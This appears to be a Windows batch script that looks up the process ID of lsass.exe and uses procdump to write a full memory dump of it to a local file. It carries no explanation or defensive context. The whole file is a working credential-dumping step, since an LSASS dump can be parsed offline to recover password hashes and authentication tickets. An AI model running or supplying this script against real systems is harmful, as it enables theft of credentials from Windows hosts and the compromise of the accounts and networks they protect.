@echo off
for /f "tokens=2" %%i in ('C:\Windows\System32\tasklist.exe /fi "imagename eq lsass.exe" /nh') do set PID=%%i
echo LSASS PID: %PID%
.\procdump.exe -accepteula -ma %PID% .\lsass_procdump.dmp
echo Done.
dir .\lsass_procdump.dmp
